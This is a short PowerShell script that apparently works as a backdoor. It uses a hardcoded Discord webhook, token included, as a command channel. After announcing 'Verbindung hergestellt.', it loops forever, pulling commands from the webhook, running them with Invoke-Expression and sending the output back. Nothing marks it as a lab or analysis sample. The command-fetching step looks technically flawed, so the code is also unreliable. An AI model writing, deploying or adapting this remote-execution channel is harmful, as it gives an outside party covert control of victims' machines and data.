$webhookURL = 'https://discord.com/api/webhooks/1195732732693717112/KkX_ctFkiqFGDQwCR_UhhwDh5kAD-27vdiDdEw8sYPhFvKNoGsq39Wxk8MQhvC9GxaGv'

function Send-DiscordMessage {
    param (
        [string]$message
    )

    $body = @{
        content = $message
    }

    Invoke-RestMethod -Uri $webhookURL -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
}

Send-DiscordMessage "Verbindung hergestellt."

while ($true) {
    $command = (Invoke-RestMethod -Uri $webhookURL).content
    $output = Invoke-Expression $command
    Send-DiscordMessage $output
}
